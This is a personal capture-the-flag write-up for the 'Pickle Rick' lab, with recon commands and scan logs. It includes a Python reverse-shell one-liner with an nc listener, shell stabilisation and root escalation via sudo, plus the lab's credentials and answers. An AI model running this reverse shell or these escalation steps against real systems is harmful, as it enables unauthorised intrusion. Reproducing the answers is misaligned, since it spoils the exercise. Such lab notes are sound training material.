# Pickle Rick CTF notes

###### [Home](https://eduardo-granados.github.io/)

---

# Playbook

(Could use hydra, but would be too easy)

export IP=10.10.200.202 (IP will change), but will be useful to not have rewrite IP address

1. Look up source IP on a browser


2. Inspect page source code


3. nmap scan IP address 
    - nmap -v2 -sC -sV -oN nmap_scap.log $IP


4. Run a nikto scan and log it
   - nikto -h http://$IP | tee nikto_scan.log 
   - Check out robots.txt, if it has one


5. Run gobuster
   - gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,py | tee gobuster_scan.log
   - there is a login page 


6. Command panel is shown, try out commands
    - grep pattern filename -> grep . file.txt
    OR
    - while read line; do echo $line; done < clue.txt


7. with access to a command line, lets set up a reverse shell
   - using python or netcat
   - python3 -c "print('hello')"


8. use pentestmonkey to create a reverse shell with
   - pentestmonkey.net
   - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   - nc -lnvp 9999


9.  stabalize reverse shell
   - /usr/bin/script -qc /bin/bash /dev/null


10. try to become root and snoop
   - sudo bash

# nmap_results

```
# Nmap 7.60 scan initiated Tue Jul  4 01:02:41 2023 as: nmap -v2 -sC -sV -oN nmap_scan.log 10.10.157.152
Nmap scan report for ip-10-10-157-152.eu-west-1.compute.internal (10.10.157.152)
Host is up, received arp-response (0.00061s latency).
Scanned at 2023-07-04 01:02:42 BST for 8s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:37:46:44:8f:24:02:f8:36:61:b5:9e:06:20:09:03 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4YqWDGijuoTjsGHWhqbaZXS7AulELXqfKO1J99N5wxEG8hA9KkPahkGlfp1XD0nVRnak0XjXJE87wtn6UybFWBBcNo078ObYer1ONnsYuUCY6RTmHyD3BCoz55+faQqc1maYtNRWEYUlo2PzNtV6+9i67jJE8WLeYSXGZTpKCDBh8ljYtc+45rIQLhbPQEQJyMKvrLX9pISgibMl4AD/x8qgqieYYNumqwf3w8/sQ+RMmDzhLCthnwoORmw/BnkF7uYYDz83cCI4AxJv/C2byazZy55vCAb9XByiAmZFlY/bIFslfXlEV+RSeGHHHHM52MkgB2pSopVbyIl9zVyyJ
|   256 2d:9c:35:99:a3:96:90:a6:a5:f4:77:8f:8b:05:50:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGQJq0EDmzoqLa/ndvEYFLGSbZg4kGCm9LRR++pTZnNd+pHoL91V4sxZqlB7zpegGCZ8Sqia+gW7vJWfk36hysc=
|   256 8e:a0:23:d6:4b:16:6f:84:c8:25:ce:6d:e7:77:3f:3c (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGuhYvMm4pq+KQjSFG4kAI7QqAdqX2zb4k2lwLh7EzF9
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:7B:6D:D6:28:CF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  4 01:02:50 2023 -- 1 IP address (1 host up) scanned in 8.34 seconds

```

# nikto_results

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.157.152
+ Target Hostname:    ip-10-10-157-152.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2023-07-04 00:05:10 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-07-04 00:05:18 (GMT1) (8 seconds)
---------------------------------------------------------------------------

```

# gobuster_results

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.157.152
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh,txt,cgi,html,js,css,py,php
[+] Timeout:        10s
===============================================================
2023/07/04 00:19:14 Starting gobuster
===============================================================
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/denied.php (Status: 302)
/server-status (Status: 403)
/clue.txt (Status: 200)
===============================================================
2023/07/04 00:53:16 Finished
===============================================================

```

# copy_pasta

```
Username: R1ckRul3s

Wubbalubbadubdub


Sup3rS3cretPickl3Ingred.txt
    -> mr. meeseek hair


assets


clue.txt
denied.php
index.html
login.php
portal.php
robots.txt


Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
-> echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | ba0== base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d 
-> rabbit hole


2nd ingredeient: 1 jerry tear


3rd ingredients: fleeb juice

```

# stabalizing_shell

```
/usr/bin/script -qc /bin/bash /dev/null

OR

nc -lnvp 9999
CRTL + z
stty raw -echo;fg
ENTER
export TERM=xterm

```

# Task_1

```
1. What is the first ingredient that Rick needs?
- 1st ingredeient: mr. meeseek hair

2. What is the second ingredient in Rick’s potion?
- 2nd ingredeient: 1 jerry tear

3. What is the last and final ingredient?
- 3rd ingredients: fleeb juice

```